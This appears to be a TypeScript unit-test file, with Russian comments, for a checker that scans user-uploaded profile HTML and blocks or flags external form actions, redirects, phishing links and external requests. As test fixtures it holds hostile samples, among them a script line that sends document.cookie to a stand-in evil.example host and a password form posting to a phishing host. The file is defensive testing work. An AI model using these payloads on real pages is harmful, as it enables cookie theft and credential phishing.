// SPDX-License-Identifier: AGPL-3.0-or-later
// Unit-тесты автопроверки HTML-страницы профиля (ТЗ §3.8): формы на сторонние
// адреса, meta refresh и авторедиректы, пароль на внешний хост, подозрительные
// ссылки, внешние скрипты и запросы. Результат: ok | blocked | flagged.
import { describe, expect, it } from 'vitest';
import {
  HTML_PAGE_MAX_BYTES,
  HtmlPageSaveSchema,
  checkHtmlPage,
  htmlByteLength,
} from '../src/html-page';

const OPTS = { sandboxDomain: 'usercontent.example.com' };

function codes(html: string): string[] {
  return checkHtmlPage(html, OPTS).reasons.map((reason) => reason.code);
}

describe('checkHtmlPage: чистая страница', () => {
  it('пропускает обычную разметку и внешние картинки-ресурсы', () => {
    const html = `<!doctype html><html><head><title>Визитка</title></head>
<body><h1>Привет</h1><img src="https://cdn.example.com/photo.png" alt="фото">
<a href="https://github.com/me">Мой GitHub</a></body></html>`;
    expect(checkHtmlPage(html, OPTS)).toEqual({ status: 'ok', reasons: [] });
  });

  it('считает относительные и «свои» формы безопасными', () => {
    expect(codes('<form action="/subscribe"><input name="email"></form>')).toEqual([]);
    expect(codes('<form action="https://usercontent.example.com/submit"></form>')).toEqual([]);
  });
});

describe('checkHtmlPage: формы на сторонние адреса (ТЗ §3.8)', () => {
  it('блокирует форму с внешним action', () => {
    const html = '<form action="https://evil.example/collect" method="post"><input name="a"></form>';
    const result = checkHtmlPage(html, OPTS);
    expect(result.status).toBe('blocked');
    expect(result.reasons[0]).toMatchObject({ code: 'external_form_action', severity: 'blocked' });
  });

  it('блокирует парольный ввод в форме на внешний хост', () => {
    const html = '<form action="https://phish.example/login"><input type="password" name="p"></form>';
    const result = checkHtmlPage(html, OPTS);
    expect(result.status).toBe('blocked');
    expect(codes(html)).toEqual(expect.arrayContaining(['external_form_action', 'password_form_external']));
  });

  it('пропускает пароль в форме на свой домен (подозрительно, но не блок)', () => {
    const html = '<form action="/local"><input type="password" name="p"></form>';
    expect(checkHtmlPage(html, OPTS).status).toBe('ok');
  });
});

describe('checkHtmlPage: автоперенаправления (ТЗ §3.8)', () => {
  it('блокирует meta refresh с url', () => {
    const html = '<meta http-equiv="Refresh" content="0;url=https://evil.example">';
    const result = checkHtmlPage(html, OPTS);
    expect(result.status).toBe('blocked');
    expect(result.reasons[0].code).toBe('meta_refresh');
  });

  it('помечает meta refresh без url', () => {
    expect(checkHtmlPage('<meta http-equiv="refresh" content="5">', OPTS).status).toBe('flagged');
  });

  it('блокирует присваивание location в скрипте', () => {
    const html = '<script>window.location = "https://evil.example";</script>';
    expect(checkHtmlPage(html, OPTS).status).toBe('blocked');
    expect(codes(html)).toContain('auto_redirect');
  });

  it('блокирует location.replace', () => {
    expect(codes('<script>location.replace("https://evil.example")</script>')).toContain('auto_redirect');
  });
});

describe('checkHtmlPage: подозрительные ссылки и скрипты', () => {
  it('блокирует фишинговую ссылку на внешний вход', () => {
    const html = '<a href="https://evil.example/login">Войти в аккаунт</a>';
    const result = checkHtmlPage(html, OPTS);
    expect(result.status).toBe('blocked');
    expect(result.reasons[0].code).toBe('suspicious_link');
  });

  it('помечает javascript:-ссылку, но не блокирует', () => {
    const result = checkHtmlPage('<a href="javascript:void(0)">клик</a>', OPTS);
    expect(result.status).toBe('flagged');
    expect(result.reasons[0].code).toBe('javascript_url');
  });

  it('помечает внешний скрипт', () => {
    const result = checkHtmlPage('<script src="https://cdn.example.com/x.js"></script>', OPTS);
    expect(result.status).toBe('flagged');
    expect(result.reasons[0].code).toBe('external_script');
  });

  it('помечает запрос на внешний адрес из скрипта', () => {
    const html = '<script>fetch("https://evil.example/steal?d=" + document.cookie)</script>';
    expect(codes(html)).toContain('external_request');
  });

  it('не помечает запрос на свой домен', () => {
    expect(codes('<script>fetch("/api/me")</script>')).toEqual([]);
  });
});

describe('HtmlPageSaveSchema', () => {
  it('принимает код с заметкой и флагом публикации', () => {
    const parsed = HtmlPageSaveSchema.parse({ html: '<h1>ok</h1>', note: 'черновик', published: true });
    expect(parsed).toMatchObject({ note: 'черновик', published: true });
  });

  it('отклоняет пустую страницу', () => {
    expect(HtmlPageSaveSchema.safeParse({ html: '' }).success).toBe(false);
  });

  it('отклоняет страницу больше 2 МБ и принимает ровно на границе', () => {
    const limit = 'a'.repeat(HTML_PAGE_MAX_BYTES);
    const over = 'a'.repeat(HTML_PAGE_MAX_BYTES + 1);
    expect(HtmlPageSaveSchema.safeParse({ html: limit }).success).toBe(true);
    expect(HtmlPageSaveSchema.safeParse({ html: over }).success).toBe(false);
  });

  it('считает размер в байтах UTF-8, а не в символах', () => {
    expect(htmlByteLength('ы')).toBe(2);
    const twoMbOfCyrillic = 'ы'.repeat(HTML_PAGE_MAX_BYTES / 2);
    expect(htmlByteLength(twoMbOfCyrillic)).toBe(HTML_PAGE_MAX_BYTES);
    expect(HtmlPageSaveSchema.safeParse({ html: twoMbOfCyrillic }).success).toBe(true);
    expect(HtmlPageSaveSchema.safeParse({ html: `${twoMbOfCyrillic}ы` }).success).toBe(false);
  });
});
